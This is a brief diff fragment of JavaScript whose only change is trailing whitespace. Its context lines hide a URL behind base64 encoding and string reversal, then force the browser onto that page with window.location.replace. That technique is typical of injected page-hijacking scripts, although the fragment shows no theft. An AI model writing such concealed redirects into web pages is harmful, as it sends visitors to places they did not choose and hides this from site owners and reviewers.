@@ -13,4 +13,4 @@
   _1x = _1x.split('').reverse().join('');
   var _3x = atob("aHR0cHM6Ly90b3JuYWRvc3QuZ2l0aHViLmlvL2ZlZWQvYmxvZw==");
   window.location.replace(_3x);
-})();
+})(); 
